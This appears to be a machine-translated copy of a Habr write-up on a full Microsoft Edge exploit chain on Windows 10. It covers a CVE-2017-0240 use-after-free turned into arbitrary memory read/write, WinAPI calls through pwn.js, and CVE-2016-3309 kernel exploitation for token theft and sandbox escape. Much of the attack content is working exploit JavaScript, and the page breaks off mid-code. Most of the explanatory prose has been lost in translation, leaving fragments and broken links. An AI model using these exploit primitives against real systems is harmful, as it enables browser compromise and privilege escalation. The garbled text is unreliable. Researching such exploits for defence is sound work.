<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🥋 👨🏼‍🎤 💳 Windows 10でのCVEからRCEへのMicrosoft Edge 🎩 👆🏼 👶🏿</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="この記事のフレームワークでは、Microsoft Edgeの脆弱性のエクスプロイトを記述し、その後サンドボックスを終了するプロセスを詳細に検討します。このプロセスがどのように見えるかに興味がある場合は、猫の下にようこそ！
 前書き
 

 Pwn2Own 2019  Microsoft Edge. ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Windows 10でのCVEからRCEへのMicrosoft Edge</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/455594/"><p><img src="https://habrastorage.org/webt/l6/oc/0a/l6oc0axkoxyoiss6dr77cytm1_e.jpeg" alt="はじめに"></p><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">この記事のフレームワークでは、Microsoft Edgeの脆弱性のエクスプロイトを記述し、その後サンドボックスを終了するプロセスを詳細に検討します。</font><font style="vertical-align: inherit;">このプロセスがどのように見えるかに興味がある場合は、猫の下にようこそ！</font></font></p><a name="habracut"></a><br>
<h2 id="vvedenie"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">前書き</font></font></h2><br>
<p>  <code>Pwn2Own 2019</code>       <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>    <code>Microsoft Edge</code>.      : <code>double free</code>         .          <code>CVE</code>: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><code>CVE-2019-0940</code></a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><code>CVE-2019-0938</code></a>.       : <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Pwn2Own 2019: Microsoft Edge Renderer Exploitation (CVE-2019-0940). Part 1</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Pwn2Own 2019: Microsoft Eedge Sandbox Escape (CVE-2019-0938). Part 2</a>.</p><br>
<p>            ,            <code>Microsoft Edge</code>  <code>Windows 10</code>   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><code>CVE-2017-0240</code></a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><code>CVE-2016-3309</code></a>.     , ,   ,   <code>Pwn2Own</code>,       ,              <code>Windows 10</code>.     <code>Microsoft</code>,      ,     .  ,      ,         .</p><br>
<h2 id="ishodnye-dannye"> </h2><br>
<p>       1-day    <code>Microsoft Edge</code>.   <code>CVE-2017-0240</code>.           [1],   <code>arbitrary address read/write</code> ,      ,        .      <code>pwn.js</code>,            ,     <code>mitigations</code>    .         Windows <code>CVE-2016-3309</code>   ,   <code>AppContainer</code>       .</p><br>
<p>     c  <code>Microsoft Windows 10 Pro 1703 (10.0.15063)</code>   <code>Microsoft Edge (40.15063.0.0)</code>.</p><br>
<h2 id="shag-1-poluchenie-arbitrary-address-readwrite-primitiva"> 1.  <code>arbitrary address read/write</code> </h2><br>
<h3 id="opisanie-uyazvimosti-i-poluchenie-oob">    <code>OOB</code></h3><br>
<p>  <code>use-after-free</code>    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">copyFromChannel</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Audio​Buffer</a>.</p><br>
<blockquote>AudioBuffer —      (audio asset),         AudioContext.decodeAudioData(),        AudioContext.createBuffer().   AudioBuffer       AudioBufferSourceNode.</blockquote><p>  <code>The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</code>      .    <code>copyFromChannel</code>     -   <code>destination</code>,   .      (<code>channelNumber</code>)    - (<code>startInChannel</code>),      .      <code>destination</code>   <code>CDOMAudioBuffer::Var_copyFromChannel</code>    <code>destination</code> (          )     <code>channelNumber</code>  <code>startInChannel</code>   <code>Int</code>,      <code>valueOf</code>  .    ,              <code>valueOf</code> .     :</p><br>
<pre><code class="javascript hljs"><span class="hljs-comment">// ,    </span>
<span class="hljs-keyword">var</span> t2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float32Array</span>(<span class="hljs-number">0x20000</span>);
<span class="hljs-keyword">var</span> ta = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(t2.buffer);
<span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;t2.length;i++)<font></font>
    t2[i] = <span class="hljs-number">0x66</span>;<font></font>
<font></font>
<span class="hljs-keyword">var</span> myctx = <span class="hljs-keyword">new</span> AudioContext();
<span class="hljs-keyword">var</span> audioBuf = myctx.createBuffer(<span class="hljs-number">1</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">22050</span>);<font></font>
<font></font>
<span class="hljs-comment">//   -  </span>
<span class="hljs-keyword">var</span> t = audioBuf.getChannelData(<span class="hljs-number">0</span>);
<span class="hljs-keyword">var</span> ta2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(t.buffer);
<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;ta2.length;i++)<font></font>
    ta2[i]=<span class="hljs-number">0x55</span>;<font></font>
<font></font>
<span class="hljs-comment">//     valueOf</span>
<span class="hljs-keyword">var</span> obj = {
    <span class="hljs-attr">valueOf</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{<font></font>
<font></font>
        <span class="hljs-comment">//  </span>
        <span class="hljs-keyword">var</span> worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">'worker.js'</span>);<font></font>
        worker.postMessage(<span class="hljs-number">0</span>, [t2.buffer]);<font></font>
        worker.terminate();<font></font>
        worker = <span class="hljs-literal">null</span>;<font></font>
<font></font>
        <span class="hljs-comment">//   </span>
        sleep(<span class="hljs-number">1000</span>);<font></font>
<font></font>
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;      <font></font>
    }<font></font>
};<font></font>
<font></font>
<span class="hljs-comment">//  </span>
audioBuf.copyFromChannel(t2, obj, <span class="hljs-number">0</span>);</code></pre><br>
<p>        <code>Web Workers</code>.   <code>Worker</code>,         <code>postMessage</code>.    <code>transfer</code>     <code>Transferable</code>- (<code>ArrayBuffer</code>, <code>MessagePost</code>  <code>ImageBitmap</code>),       <code>Worker</code>         ,     .     <code>sleep</code> — ,      ( ).    ,     (<code>GC</code>, <code>Garbage Collector</code>)   ,     .</p><br>
<blockquote>Web Worker-         .  Worker'        .   ,    /,  XMLHttpRequest (  responseXML  channel    null).  Worker    JavaScript -   ,    ( ).</blockquote><p>    Edge  ,    .</p><br>
<p><img src="https://habrastorage.org/webt/iv/vx/zx/ivvxzxzff-qsxl8pxdqy6pmkbnq.png" alt="ステップ01クラッシュ"></p><br>
<p>   <code>copyFromChannel</code>    -    .           - .       .</p><br>
<p>  <code>Chakra</code> (<code>JS</code>-,    <code>Edge</code>)   :     ,      ( ,   <code>IntArray</code>)      — ,       .     ,     ,    .         .     :</p><br>
<p><img src="https://habrastorage.org/webt/kh/i1/wr/khi1wrtatqg2jq2bkhaz29b7u68.jpeg" alt="配列構造"></p><br>
<p> ,          ,         -.     ,      <code>sleep(1000);</code>:</p><br>
<pre><code class="javascript hljs">...<font></font>
<font></font>
        <span class="hljs-comment">/*        ,
           .   arr  
             */</span>
        arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">128</span>);
        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arr.length; i++)<font></font>
        {<font></font>
            arr[i] = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">0x3ff0</span>);
            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; arr[i].length; j++)<font></font>
                arr[i][j] = <span class="hljs-number">0x30303030</span>;<font></font>
        }<font></font>
<font></font>
...</code></pre><br>
<p>    ,         (    ,   — 0x10000 ).   ,       <code>memcpy</code> ( <code>memcpy</code>  ,       <code>edgehtml!WebCore::AudioBufferData::copyBufferData</code>),    .   :</p><br>
<p><img src="https://habrastorage.org/webt/nn/5u/yn/nn5uyncl0hvooyoar3lnua8cc8u.png" alt="ステップ02"></p><br>
<p>!         .       —  ,        .   -  :</p><br>
<pre><code class="javascript hljs">...<font></font>
<font></font>
var t = audioBuf.getChannelData(<span class="hljs-number">0</span>);
<span class="hljs-keyword">var</span> ta2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(t.buffer);<font></font>
<font></font>
ta2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;           ta2[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<font></font>
ta2[<span class="hljs-number">2</span>] = <span class="hljs-number">0xffe0</span>;      ta2[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<font></font>
ta2[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;           ta2[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<font></font>
ta2[<span class="hljs-number">6</span>] = <span class="hljs-number">0xfba6</span>;      ta2[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;<font></font>
ta2[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;           ta2[<span class="hljs-number">9</span>] = <span class="hljs-number">0x7fffffff</span> - <span class="hljs-number">2</span>;<font></font>
ta2[<span class="hljs-number">10</span>] = <span class="hljs-number">0x7fffffff</span>; ta2[<span class="hljs-number">11</span>] = <span class="hljs-number">0</span>;<font></font>
ta2[<span class="hljs-number">12</span>] = <span class="hljs-number">0</span>;          ta2[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<font></font>
ta2[<span class="hljs-number">14</span>] = <span class="hljs-number">0x40404040</span>; ta2[<span class="hljs-number">15</span>] = <span class="hljs-number">0x50505050</span>;<font></font>
<font></font>
...</code></pre><br>
<p>    <code>ta2[14]</code>  <code>ta2[15]</code> —       ,     .             <code>arr</code>  :</p><br>
<pre><code class="javascript hljs">...<font></font>
for(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arr.length; i++)<font></font>
{<font></font>
    <span class="hljs-keyword">if</span>(arr[i][<span class="hljs-number">0</span>] == <span class="hljs-number">0x40404040</span> &amp;&amp; arr[i][<span class="hljs-number">1</span>] == <span class="hljs-number">0x50505050</span>)<font></font>
    {<font></font>
        alert(<span class="hljs-string">'Target array idx: '</span> + i);<font></font>
        target_idx = i;<font></font>
        target_arr = arr[i];<font></font>
        <span class="hljs-keyword">break</span>;<font></font>
    }<font></font>
}</code></pre><br>
<p>     ,        ,   .    ,    ,      .      .</p><br>
<p>    ,       :   ,    ,    ,    . ,      ,     <code>JIT</code>-   .   , ,  :</p><br>
<pre><code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">arr_get</span>(<span class="hljs-params">idx</span>) </span>{
    <span class="hljs-keyword">return</span> target_arr[idx];<font></font>
}<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">arr_set</span>(<span class="hljs-params">idx, val</span>) </span>{<font></font>
    target_arr[idx] = val;<font></font>
}<font></font>
<font></font>
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x3ff0</span>; i++)<font></font>
{<font></font>
    arr_set(i, arr_get(i));<font></font>
}</code></pre><br>
<p> ,    <code>arr_get</code>  <code>arr_set</code>      (<code>OOB</code>, <code>out-of-bound</code>).</p><br>
<h3 id="ispolzovanie-oob-dlya-polucheniya-primitiva-chteniya-i-zapisi-po-proizvolnomu-adresu"> <code>OOB</code>         </h3><br>
<p>    ,           <code>OOB</code>. ,      ,    ,     [1],      .</p><br>
<p>   <code>Edge</code>      ,       -         ,      .</p><br>
<p>-,            (<code>vftable</code>),         (<code>ASLR</code>).            ?       <code>DataView</code>.</p><br>
<blockquote> DataView             ArrayBuffer,     .</blockquote><p>  <code>DataView</code>    .        , ,      <code>DataView</code> (<code>dv1</code>  <code>dv2</code>)  :    <code>dv1</code>   <code>dv2</code>      .    <code>dv1</code>      <code>dv2</code>,         .      :</p><br>
<p><img src="https://habrastorage.org/webt/ch/9n/do/ch9ndofe4zamumfvihnmv6xtg-o.jpeg" alt="任意のアドレスの読み取り/書き込み"></p><br>
<p>   ,       .     :    <code>Array</code>,   <code>OOB</code>   <code>vftable</code>  <code>typeId</code> (  64-  )      ,    . ,      <code>vftable</code>  <code>typeId</code>.          ,       .   ,       <code>IntArray</code>,      4-     .         <code>ObjectArray</code>,        .    <code>vftable</code>  <code>typeId</code>. ,      <code>vftable</code>  <code>typeId</code>,          .       :</p><br>
<p><img src="https://habrastorage.org/webt/un/np/-z/unnp-zlvr6ql9m5_f9rmxrdwt20.jpeg" alt="ポインターリーク"></p><br>
<p>       :</p><br>
<pre><code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addressOf</span>(<span class="hljs-params">obj</span>) </span>{
    <span class="hljs-keyword">var</span> hdr_backup = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">4</span>);
    <span class="hljs-comment">//  vftable  typeId intarr_object</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<font></font>
        hdr_backup[i] = arr_get(intarr_idx + i);<font></font>
    intarr_object[<span class="hljs-number">0</span>] = obj;
    <span class="hljs-comment">//  vftable  typeId intarr_object</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<font></font>
        arr_set(intarr_idx + i, hdr_backup[i]);<font></font>
    <span class="hljs-comment">//        </span>
    <span class="hljs-keyword">return</span> [intarr_object[<span class="hljs-number">0</span>], intarr_object[<span class="hljs-number">1</span>]];<font></font>
}</code></pre><br>
<p>           <code>OOB</code>.    ,     ,         ,      .    ,            . ..         ,           <code>0x10000</code>,           .   ,      -  (,  <code>DataView</code>    <code>byteOffset</code>) ,        (,    <code>Edge</code>  <code>IntArray</code>   <code>0x18</code>    <code>0x10005</code>).</p><br>
<p>   ,        .        <code>DataView</code>.</p><br>
<p><img src="https://habrastorage.org/webt/fe/i5/o3/fei5o3k0zh3pogdmb5diifeick8.png" alt="メモリーリーク"></p><br>
<h2 id="shag-2-vypolnenie-proizvolnyh-funkciy-api"> 2.    API</h2><br>
<p>                <code>Edge</code>.   ,          .       <code>  app specific security mitigation</code> (<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> 1, </a>, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> 2, Internet Explorer  Edge</a>, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> 3, Google Chrome</a>),   ,              .</p><br>
<h3 id="randomizaciya-adresnogo-prostranstva-aslr">   (<code>ASLR</code>)</h3><br>
<blockquote>ASLR (. address space layout randomization — «   ») — ,    ,              ,  :   ,  ,   .</blockquote><p>       ,  ,         <code>Chakra.dll</code>,   <code>ASLR</code>      .</p><br>
<h3 id="data-execution-protection-dep-nx">Data execution protection (<code>DEP</code>, <code>NX</code>)</h3><br>
<blockquote>   (. Dáta Execútion Prevéntion, DEP) —  ,   Linux, Mac OS X, Android  Windows,         ,   «  ».     , , ,         .</blockquote><p>      —  <code>VirtualAlloc</code>   <code>ROP</code>-.    <code>Edge</code>     - <code>ACG</code> (. ).</p><br>
<h3 id="control-flow-guard-cfg">Control Flow Guard (<code>CFG</code>)</h3><br>
<blockquote><code>CFG</code> —  ,   ,             .         (indirect calls),      (,     )</blockquote><p>     , ,       .      ,       <code>ROP</code>-.    <code>ROP/JOP/COP</code>-     <code>Intel</code>: <code>Control-flow Enforcement Technology</code> (<code>CET</code>).      :</p><br>
<ol>
<li><code>Shadow Stack</code> ( ) —         <code>ROP</code>-;</li>
<li><code>Indirect Branch Tracking</code> —    <code>JOP/COP</code>-.      <code>ENDBRANCH</code>,        <code>call</code>  <code>jmp</code>-.</li>
</ol><br>
<h3 id="arbitrary-code-guard-acg">Arbitrary Code Guard (<code>ACG</code>)</h3><br>
<blockquote><code>ACG</code> —  ,     (  <code>rwx</code>-    <code>VirtaulAlloc</code>)    (      )</blockquote><p> ,   <code>CFG</code>,    <code>ROP</code>-.</p><br>
<h3 id="appcontainer-isolation">AppContainer Isolation</h3><br>
<blockquote>AppContainer —  Microsoft,   ,    -.        , ,  , ,           ,       .</blockquote><p>     . -                    .     ,      AppContainer           .</p><br>
<p> ,   <code>Microsoft</code>   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> </a>    <code>security mitigation</code>-.   ,      ( <code>ROP</code>-    )    , ..   .</p><br>
<h3 id="ispolzovanie-pwnjs"> pwn.js</h3><br>
<p>     ,           <code>AppContainer</code>.           <code>Windows</code>.       <code>JS</code>-  <code>ROP</code>-.    ,   <code>ROP</code>-,    .        ,          <code>WinAPI</code>.  ,      <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><code>pwn.js</code></a>.   ,    <code>read</code>  <code>write</code>     ,    <code>API</code>     <code>WinAPI</code>   .  <code>pwn.js</code>       64-         .</p><br>
<p>  .          <code>DataView</code>.       :</p><br>
<pre><code class="javascript hljs"><span class="hljs-keyword">var</span> Exploit = (<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{<font></font>
<font></font>
    <span class="hljs-keyword">var</span> ChakraExploit = pwnjs.ChakraExploit;
    <span class="hljs-keyword">var</span> Integer = pwnjs.Integer;<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Exploit</span>(<span class="hljs-params"></span>) </span>{<font></font>
        ChakraExploit.call(<span class="hljs-keyword">this</span>);<font></font>
<font></font>
        ...<font></font>
        <span class="hljs-comment">//  arbitrary address read/write   </span><font></font>
        ...<font></font>
<font></font>
        <span class="hljs-comment">// DataView,        </span>
        <span class="hljs-keyword">this</span>.dv = ...;
        <span class="hljs-comment">// DataView,     this.dv</span>
        <span class="hljs-keyword">this</span>.dv_offset = ...;
        <span class="hljs-comment">//    Chakra.dll, ,    </span>
        <span class="hljs-keyword">var</span> vtable = ...;
        <span class="hljs-keyword">this</span>.initChakra(vtable);<font></font>
    }<font></font>
    Exploit.prototype = <span class="hljs-built_in">Object</span>.create(ChakraExploit.prototype);<font></font>
    Exploit.prototype.constructor = Exploit;<font></font>
<font></font>
    Exploit.prototype.set_dv_address = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">lo, hi</span>) </span>{
        <span class="hljs-keyword">this</span>.dv_offset.setInt32(<span class="hljs-number">0x38</span>, lo, <span class="hljs-literal">true</span>);
        <span class="hljs-keyword">this</span>.dv_offset.setInt32(<span class="hljs-number">0x3c</span>, hi, <span class="hljs-literal">true</span>);<font></font>
    }<font></font>
<font></font>
    Exploit.prototype.read = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">address, size</span>) </span>{
        <span class="hljs-keyword">this</span>.set_dv_address(address.low, address.high);
        <span class="hljs-keyword">switch</span> (size) {
            <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Integer(<span class="hljs-keyword">this</span>.dv.getInt8(<span class="hljs-number">0</span>, <span class="hljs-literal">true</span>), <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);
            <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Integer(<span class="hljs-keyword">this</span>.dv.getInt16(<span class="hljs-number">0</span>, <span class="hljs-literal">true</span>), <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);
            <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Integer(<span class="hljs-keyword">this</span>.dv.getInt32(<span class="hljs-number">0</span>, <span class="hljs-literal">true</span>), <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);
            <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>: <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Integer(<span class="hljs-keyword">this</span>.dv.getInt32(<span class="hljs-number">0</span>, <span class="hljs-literal">true</span>),
                                        <span class="hljs-keyword">this</span>.dv.getInt32(<span class="hljs-number">4</span>, <span class="hljs-literal">true</span>), <span class="hljs-literal">true</span>);<font></font>
        }<font></font>
    }<font></font>
    Exploit.prototype.write = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">address, value, size</span>) </span>{
        <span class="hljs-keyword">this</span>.set_dv_address(address.low, address.high);
        <span class="hljs-keyword">switch</span> (size) {
            <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>: <span class="hljs-keyword">this</span>.dv.setInt8(<span class="hljs-number">0</span>, value.low, <span class="hljs-literal">true</span>); <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>: <span class="hljs-keyword">this</span>.dv.setInt16(<span class="hljs-number">0</span>, value.low, <span class="hljs-literal">true</span>); <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>: <span class="hljs-keyword">this</span>.dv.setInt32(<span class="hljs-number">0</span>, value.low, <span class="hljs-literal">true</span>); <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:
                <span class="hljs-keyword">this</span>.dv.setInt32(<span class="hljs-number">0</span>, value.low, <span class="hljs-literal">true</span>);
                <span class="hljs-keyword">this</span>.dv.setInt32(<span class="hljs-number">4</span>, value.high, <span class="hljs-literal">true</span>);
                <span class="hljs-keyword">break</span>;<font></font>
        }<font></font>
    }<font></font>
    <span class="hljs-keyword">return</span> Exploit;<font></font>
})();</code></pre><br>
<p>    ,      <code>MessageBoxA</code>:</p><br>
<pre><code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>) </span>{
    <span class="hljs-keyword">with</span> (<span class="hljs-keyword">new</span> Exploit()) {
        <span class="hljs-comment">//alert('Chakra: ' + chakraBase.toString(16));</span>
        <span class="hljs-keyword">var</span> MessageBoxA = importFunction(<span class="hljs-string">'user32.dll'</span>, <span class="hljs-string">'MessageBoxA'</span>, Int32);
        <span class="hljs-keyword">var</span> GetActiveWindow = importFunction(<span class="hljs-string">'user32.dll'</span>, <span class="hljs-string">'GetActiveWindow'</span>, Int64);
        <span class="hljs-keyword">var</span> hwnd = GetActiveWindow();
        <span class="hljs-keyword">var</span> ret = MessageBoxA(hwnd, <span class="hljs-keyword">new</span> CString(<span class="hljs-string">'PWNED'</span>), <span class="hljs-keyword">new</span> CString(<span class="hljs-string">'PWNED'</span>), <span class="hljs-number">0</span>);<font></font>
    }<font></font>
}</code></pre><br>
<p>     :</p><br>
<p><img src="https://habrastorage.org/webt/vm/zb/t1/vmzbt1z0du0bnjto8mxpwzo9hac.png" alt="Pwned"></p><br>
<h2 id="shag-3-povyshenie-privilegiy-i-vyhod-iz-pesochnicy-s-pomoschyu-uyazvimosti-yadra"> 3.          </h2><br>
<p>        <code>WinAPI</code>.         .      <code>CVE-2016-3309</code>.         [7]  [8],     <code>pwn.js</code> [2]    ,        <code>GDI</code>-.         [9], [10]  [11].              .        ,      .       ,                <code>AppContainer</code>,          <code>pwn.js</code>.           <code>cmd.exe</code>    <code>SYSTEM</code>.</p><br>
<blockquote>GDI —   Windows          , ,    .</blockquote><p>,             . <code>JS</code>-     64-     <code>kernel_read_64</code>  <code>kernel_write_64</code>, .        Windows.           <code>BITMAP</code>,    . <code>pwn.js</code>     .  <code>BITMAP</code>  , , :</p><br>
<pre><code class="javascript hljs"><span class="hljs-keyword">var</span> BITMAP = <span class="hljs-keyword">new</span> StructType([<font></font>
    [<span class="hljs-string">'poolHeader'</span>, <span class="hljs-keyword">new</span> ArrayType(Uint32, <span class="hljs-number">4</span>)],
    <span class="hljs-comment">// BASEOBJECT64</span>
    [<span class="hljs-string">'hHmgr'</span>, Uint64],<font></font>
    [<span class="hljs-string">'ulShareCount'</span>, Uint32],<font></font>
    [<span class="hljs-string">'cExclusiveLock'</span>, Uint16],<font></font>
    [<span class="hljs-string">'BaseFlags'</span>, Uint16],<font></font>
    [<span class="hljs-string">'Tid'</span>, Uint64],<font></font>
    [<span class="hljs-string">'dhsurf'</span>, Uint64],<font></font>
    [<span class="hljs-string">'hsurf'</span>, Uint64],<font></font>
    [<span class="hljs-string">'dhpdev'</span>, Uint64],<font></font>
    [<span class="hljs-string">'hdev'</span>, Uint64],<font></font>
    [<span class="hljs-string">'sizlBitmap'</span>, SIZEL],<font></font>
    [<span class="hljs-string">'cjBits'</span>, Uint32],<font></font>
    [<span class="hljs-string">'pvBits'</span>, Uint64],<font></font>
    [<span class="hljs-string">'pvScan0'</span>, Uint64],<font></font>
]);</code></pre><br>
<p> <code>Tid</code>       <code>KTHREAD</code>     , ,   ,   <code>EmpCheckErrataList</code>,        .  ,        :</p><br>
<pre><code class="javascript hljs">...<font></font>
var nt_EmpCheckErrataList_ptr = worker_bitmap_obj.Tid.add(<span class="hljs-number">0x2a8</span>);
<span class="hljs-keyword">var</span> nt_EmpCheckErrataList = kernel_read_64(nt_EmpCheckErrataList_ptr);
<span class="hljs-comment">/* g_config   ,     
   empCheckErrataList  WinDbg        :
? nt!EmpCheckErrataList - nt */</span>
<span class="hljs-keyword">var</span> ntoskrnl_base_address = nt_EmpCheckErrataList.sub(<font></font>
        g_config.nt_empCheckErrataList_offset);<font></font>
...</code></pre><br>
<p>   ,     <code>AppContainer</code>    .    <code>AppContainer</code>    <code>IsPackagedProcess</code>     (<code>Process Environment Block</code>, <code>PEB</code>),         .    <code>Access Token</code>,         <code>AppContainer</code>.       <code>Access Token</code>  ,         . <code>Access Token</code>     ,     .     <code>EPROCESS</code>    <code>ActiveProcessLinks</code>,       .   <code>PEB</code>     <code>EPROCESS</code>.          <code>PsInitialSystemProcess</code> ,   ,         <code>ActiveProcessLinks</code>.</p><br>
<p>   <code>Edge</code>    :      ,    <code>Edge</code>       .              <code>SYSTEM</code>.   , , <code>winlogon.exe</code>.</p><br>
<p>       <code>pwn.js</code>  :</p><br>
<pre><code class="javascript hljs"><span class="hljs-comment">//  PEB  </span>
<span class="hljs-keyword">var</span> pinfo = _PROCESS_BASIC_INFORMATION.Ptr.cast(malloc(_PROCESS_BASIC_INFORMATION.size));
